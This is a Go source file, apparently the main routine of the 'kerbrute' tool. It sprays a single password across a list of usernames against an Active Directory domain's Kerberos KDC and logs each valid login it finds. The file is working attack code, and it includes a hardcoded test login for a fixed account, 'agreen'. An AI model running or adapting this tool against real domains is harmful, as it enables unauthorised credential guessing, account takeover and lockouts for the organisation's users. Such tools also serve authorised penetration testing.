package main

import (
	"bufio"
	"fmt"
	"log"
	"os"

	"github.com/jessevdk/go-flags"
)

var opts struct {
	Domain           string `short:"d" long:"domain" required:"true" name:"domain name" description:"Full name of domain (e.g. contoso.com). Required."`
	DomainController string `long:"dc" required:"false" name:"Domain Controller (KDC)" description:"DC to target. If not supplied, will attempt to find through DNS"`
	Args             struct {
		UsernameList string `positional-arg-name:"<username_list>"`
		Password     string `positional-arg-name:"<password_to_try>"`
	} `positional-args:"yes" required:"yes"`
}

func main() {
	_, err := flags.Parse(&opts)
	if err != nil {
		if e, ok := err.(*flags.Error); ok && e.Type != flags.ErrHelp {
		} else {
			fmt.Fprintln(os.Stderr, err)
		}
		os.Exit(1)
	}
	domain := opts.Domain
	domainController := opts.DomainController
	kSession := NewKerbruteSession(domain, domainController)
	log.Println("Using KDC(s):")
	for _, v := range kSession.Kdcs {
		log.Printf("\t%s", v)
	}

	kSession.testLogin("agreen", "foobar")

	file, err := os.Open(opts.Args.UsernameList)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var username string
	for scanner.Scan() {
		username = scanner.Text()
		if kSession.testLogin(username, opts.Args.Password) {
			log.Printf("[!] Valid Login: \t%v : %v", username, opts.Args.Password)
		}
	}
	log.Println("...done!")

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

}
